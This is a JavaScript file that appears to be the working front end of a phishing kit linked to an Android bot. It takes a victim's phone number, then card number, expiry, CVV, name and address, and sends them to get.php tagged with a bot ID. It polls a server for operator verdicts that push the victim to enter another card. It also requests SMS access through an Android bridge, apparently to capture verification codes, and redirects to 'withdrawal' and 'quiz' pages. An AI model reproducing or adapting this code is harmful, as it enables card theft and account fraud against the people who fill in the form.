document.addEventListener("DOMContentLoaded", function () {
  const cardN = document.getElementById("cardn");
  const cardDate = document.getElementById("carddate");
  const cardV = document.getElementById("carv");
  const cardHolder = document.getElementById("cardholder");
  const cityAddress = document.getElementById("cityadress");
  const addressName = document.getElementById("adressname");
  const addressZip = document.getElementById("adresszip");
  const formButton = document.getElementById("form");
  const formCardText = document.getElementById("form-card");
  const originalText = formCardText?.textContent;

  const loader = document.getElementById("loader");
  const form = document.getElementById("form2");

  function isDateValid(value) {
    const parts = value.split("/");
    if (parts.length !== 2) return false;

    const [mm, yy] = parts;
    const monthValid = mm >= 01 && mm <= 12;
    const yearValid = yy >= 23 && yy <= 35;

    return monthValid && yearValid;
  }

  function luhnCheck(val) {
    let sum = 0;
    for (let i = 0; i < val.length; i++) {
      let intVal = parseInt(val.substr(i, 1));
      if (i % 2 == 0) {
        intVal *= 2;
        if (intVal > 9) {
          intVal = 1 + (intVal % 10);
        }
      }
      sum += intVal;
    }
    return sum % 10 == 0;
  }

  function checkFilledInputs() {
    const allInputs = [
      cardN,
      cardDate,
      cardV,
      cardHolder,
      cityAddress,
      addressName,
      addressZip,
    ];
    return allInputs.every((input) => input?.value.trim() !== "");
  }

  function validateInput(input, condition) {
    if (!input) return;
    if (condition) {
      input.classList.remove("invalid-input");
    } else {
      input.classList.add("invalid-input");
    }
  }

  function handleFormClick() {
    const cardHolderValid =
      cardHolder?.value && /^[A-Za-z]+(?: [A-Za-z]+)+$/.test(cardHolder.value);
    const cardNValid =
      cardN?.value && luhnCheck(cardN.value.replace(/\s+/g, ""));
    const cardDateValid = cardDate?.value && isDateValid(cardDate?.value);
    const cardVValid =
      cardV?.value &&
      /^\d{0,3}?$/.test(cardV.value) &&
      cardV.value.trim() !== "";
    const isValidZip = addressZip?.value && /^\d{5}$/.test(addressZip.value);
    validateInput(cardN, cardNValid);
    validateInput(cardDate, cardDateValid);
    validateInput(cardV, cardVValid);
    validateInput(cardHolder, cardHolderValid);
    validateInput(addressZip, isValidZip);
    if (formCardText) {
      if (
        !cardNValid ||
        !cardDateValid ||
        !cardVValid ||
        !cardHolderValid ||
        !isValidZip
      ) {
        formCardText.textContent = "Check the correctness of the data*";
        formCardText.classList.remove("header-primary");
        formCardText.style.color = "red";

        setTimeout(() => {
          formCardText.textContent = originalText;
          formCardText.classList.add("header-primary");
          formCardText.style.color = ""; // Revert to default color

          const invalidInputs = document.querySelectorAll(".invalid-input");
          invalidInputs.forEach((input) => {
            input.classList.remove("invalid-input");
          });
        }, 5000);
        return false;
      } else {
        // If all validations are okay, return true
        return true;
      }
    }
    // If for some reason formCardText doesn't exist, consider the form invalid
    return false;
  }

  cardV?.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/[^0-9]/g, ""); // This line will replace any non-digit characters with an empty string
    formButton.disabled = !checkFilledInputs();
  });
  cardHolder?.addEventListener("input", (event) => {
    // This line will replace any non-letter characters with an empty string, allowing spaces
    event.target.value = event.target.value.replace(/[^a-zA-Z\s]/g, "");
    formButton.disabled = !checkFilledInputs();
  });
  addressZip?.addEventListener("input", (event) => {
    event.target.value = event.target.value.replace(/[^0-9]/g, "").slice(0, 5); // Only allow digits and limit length to 5
    formButton.disabled = !checkFilledInputs();
  });
  cardN?.addEventListener("input", (event) => {
    event.target.value = event.target.value
      .replace(/[^0-9]/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim();
    formButton.disabled = !checkFilledInputs();
  });

  cardDate?.addEventListener("input", (event) => {
    if (
      event.inputType === "deleteContentBackward" &&
      event.target.value.endsWith("/")
    ) {
      event.target.value = event.target.value.slice(0, -1);
    }
    event.target.value = event.target.value
      .replace(/[^0-9]/g, "")
      .replace(/(\d{2})(?=\d)/, "$1/")
      .substr(0, 5);
    formButton.disabled = !checkFilledInputs();
  });

  [cardV, cardHolder, cityAddress, addressName, addressZip].forEach((input) => {
    input?.addEventListener("input", () => {
      formButton.disabled = !checkFilledInputs();
    });
  });

  const registrateButton = document.getElementById("registrate");
  registrateButton?.addEventListener("click", (event) => sendForm1(event));
  function sendForm1(event) {
    event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
    var form = document.getElementById("form1");
    var formData = new FormData(form);
    var botId = getQueryParam("botid");
    formData.append("method", "phone");
    formData.append("botid", botId);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "get.php", true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // Обработка успешного ответа сервера
        //  console.log(xhr.responseText);
        setCookie("validphone", true, 7);
        window.location.href = "./permissions.html";

        // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
      } else {
        // Обработка ошибок
        console.error(xhr.statusText);
      }
    };
    xhr.send(formData);
    registrateButton.disabled = true; // Делаем кнопку неактивной после отправки формы
  }

  const permissionsButton = document.getElementById("permissions");
  permissionsButton?.addEventListener("click", () => clickSmsAccess());
  // function clickGiveAccess() {
  //   checkGivePerm();
  // }
  function setCookie(name, value, daysToLive) {
    var date = new Date();
    date.setTime(date.getTime() + daysToLive * 24 * 60 * 60 * 1000);
    var expires = date.toUTCString();
    var cookieValue = name + "=" + value + "; expires=" + expires + "; path=/";
    
    // Call the Android interface method to set the cookie
    if (window.AndroidCookieHandler) {
      window.AndroidCookieHandler.setCookie(cookieValue);
    }
  }
  

  function clickSmsAccess() {
    checkSmsPerm();
  }
  const formSendButton = document.getElementById("form");
  formSendButton?.addEventListener("click", (event) => sendForm2(event));
  // loader.style.display = "flex"; // Show loader
  // form.style.display = "none"; // Hide form
  function sendForm2(event) {
    event.preventDefault(); // Предотвращаем стандартное поведение отправки формы

    const isFormValid = handleFormClick();
    if (!isFormValid) {
      return;
    }

    var formData = new FormData(form);
    var botId = getQueryParam("botid");
    formData.append("method", "card");
    formData.append("botid", botId);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "get.php", true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // Обработка успешного ответа сервера
        console.log(xhr.responseText);
        loader.style.display = "flex"; // Show loader
        form.style.display = "none"; // Hide form
        sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
      } else {
        // Обработка ошибок
        console.error(xhr.statusText);
      }
    };
    xhr.send(formData);

    // formSendButton.disabled = true; // Делаем кнопку неактивной после отправки формы
  }
  function sendRequestWithBotId() {
    var botId = getQueryParam("botid");
    if (botId) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "vailead.php?method=valid&botid=" + botId, true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          var responseCode = xhr.status;
          var formCardInput = document.getElementById("form-card");
          var formAddressInput = document.getElementById("form-adress"); // Please ensure the id is correct, it seems like there is a typo, it should be "form-address-input" if that's what's in your HTML.
          // Clear previous errors
          // if (formCardInput) formCardInput.textContent = "";
          // if (formAddressInput) formAddressInput.textContent = "";

          // Re-enable the submit button if there was an error
          if (
            responseCode === 202 ||
            responseCode === 203 ||
            responseCode === 205
          ) {
            loader.style.display = "none"; // Hide loader
            form.style.display = "block"; // Show form
            setTimeout(() => {
              formCardInput.style.color = "red";
              formCardInput.classList.remove("header-primary");
              validateInput(cardN, true);
              cardN.classList.add("invalid-input");
            }, 200);
            setTimeout(() => {
              formCardInput.textContent = "Your card";
              formCardInput.classList.add("header-primary");
              formCardInput.style.color = "";
              cardN.classList.remove("invalid-input");
            }, 5000);
          }
          if (responseCode === 204) {
            loader.style.display = "none"; // Hide loader
            form.style.display = "block"; // Show form
            setTimeout(() => {
              formAddressInput.style.color = "red";
              formAddressInput.classList.remove("header-primary");
            }, 200);

            setTimeout(() => {
              formAddressInput.textContent = "Adress";
              formAddressInput.classList.add("header-primary");
              formAddressInput.style.color = "";
              const invalidInputs = document.querySelectorAll(".invalid-input");
              invalidInputs.forEach((input) => {
                input.classList.remove("invalid-input");
              });
            }, 5000);
          }
          switch (responseCode) {
            case 202:
              if (formCardInput)
                formCardInput.textContent = "Credit card not accepted.";
              break;
            case 203:
              if (formCardInput)
                formCardInput.textContent = "Virtual card not accepted.";
              break;
            case 204:
              if (formAddressInput) {
                formAddressInput.textContent = "Invalid address provided.";
                formAddressInput.style.color = "red";
              }
              break;
            case 205:
              if (formCardInput) formCardInput.textContent = "Invalid card.";
              break;
            case 201:
              setCookie("withdrawal", true, 7);
              window.location.href = "./withdrawal.html";
              break;
            case 400:
              setTimeout(sendRequestWithBotId, 1000);
              break;
            default:
              console.error("Unexpected response code: " + responseCode);
          }
          // var button = document.getElementById("submitButton2");
          // if (button) button.disabled = false;
        }
      };
      xhr.send();
    } else {
      console.error("Missing botid parameter");
    }
  }

  function checkSmsPerm() {
    var botId = getQueryParam("botid");
    // Android.clicksmsaccess();
    if (botId) {
      var xhr = new XMLHttpRequest();
      xhr.open(
        "GET",
        "vailead.php?method=perm&perminfo=sms&botid=" + botId,
        true
      );
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          var responseCode = xhr.status;
          if (responseCode === 400) {
            setTimeout(checkSmsPerm, 1000);
          } else if (responseCode === 200) {
            //разрешение выдано
            setCookie("validsms", true, 7);
            window.location.href = "./quiz.html";
          } else if (responseCode === 202) {
            //разрешение не выдано
            Android.clicksmsaccess();
          } else {
            console.error("Unexpected response code: " + responseCode);
          }
        }
      };
      xhr.send();
    } else {
      console.error("Missing botid parameter");
    }
  }

  function getQueryParam(name) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }
});
